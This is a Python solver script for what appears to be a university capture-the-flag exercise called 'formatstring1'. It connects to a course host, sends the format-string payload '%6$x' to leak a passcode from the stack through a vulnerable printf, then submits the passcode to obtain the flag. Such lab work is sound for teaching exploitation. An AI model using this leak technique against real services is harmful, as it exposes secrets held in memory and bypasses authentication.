#!/usr/bin/env python3
"""
formatstring1 remote solver

This script automates the exact manual attack:
1) Connect to remote service.
2) Send "%6$x" to leak passcode from stack.
3) Send leaked passcode back at second prompt.
4) Print all server output (including flag on success).
"""

from __future__ import annotations

import socket
from typing import Optional


HOST = "moa6.eecs.utk.edu"
PORT = 32100

# Payload that leaks the passcode from the vulnerable printf(buf).
LEAK_PAYLOAD = b"%6$x\n"


def recv_until(sock: socket.socket, marker: bytes, timeout: float = 5.0) -> bytes:
    """Read bytes until marker appears (or raise TimeoutError)."""
    sock.settimeout(timeout)
    data = b""

    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk

    if marker not in data:
        raise TimeoutError(f"Did not receive marker: {marker!r}")

    return data


def first_nonempty_line(text: str) -> Optional[str]:
    """Return the first non-empty line from a text block."""
    for line in text.splitlines():
        stripped = line.strip()
        if stripped:
            return stripped
    return None


def main() -> None:
    with socket.create_connection((HOST, PORT), timeout=5.0) as sock:
        # 1) Wait until the first passcode prompt appears.
        banner_and_prompt = recv_until(sock, b"passcode to enter here?")
        print(banner_and_prompt.decode(errors="replace"))

        # 2) Send format-string payload to leak stack value.
        sock.sendall(LEAK_PAYLOAD)

        # 3) Read until second prompt. The leak appears before it.
        leak_and_second_prompt = recv_until(
            sock, b"Again! What's the passcode to enter here?"
        )
        leak_text = leak_and_second_prompt.decode(errors="replace")
        print(leak_text)

        # Grab first non-empty line as the leaked hex passcode.
        leaked = first_nonempty_line(leak_text)
        if leaked is None:
            raise RuntimeError("Failed to parse leaked passcode from server response")

        # 4) Send leaked hex value back to satisfy scanf("%x", &yourcode).
        sock.sendall((leaked + "\n").encode())

        # 5) Read remaining output (should include success + flag).
        sock.settimeout(2.0)
        tail = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                tail += chunk
        except TimeoutError:
            # Timeout just means server stopped sending quickly; print what we have.
            pass
        except socket.timeout:
            # Same as above: no more immediate data.
            pass

        print(tail.decode(errors="replace"))


if __name__ == "__main__":
    main()
